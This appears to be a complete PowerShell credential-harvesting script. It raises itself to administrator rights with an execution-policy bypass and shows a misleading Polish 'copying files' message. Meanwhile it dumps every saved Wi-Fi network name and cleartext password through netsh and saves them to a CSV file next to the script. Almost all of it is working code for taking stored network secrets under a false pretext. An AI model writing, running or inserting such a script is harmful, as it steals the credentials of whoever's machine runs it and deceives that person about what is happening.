# Check if the script is running as an administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    # If not running as an administrator, prompt the user to elevate privileges
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# Continue with the script execution as an administrator
Write-Host "Kopiowanie plikow..."

# Retrieve Wi-Fi network profiles and their passwords
$profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | % {(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }}

# Define the filename
$filename = "save.txt"

# Construct the full path to the script directory
$filepath = Join-Path -Path $PSScriptRoot -ChildPath $filename

# Save the output to the file
$profiles | Export-Csv -Path $filepath -NoTypeInformation

Write-Host "Gotowe!"
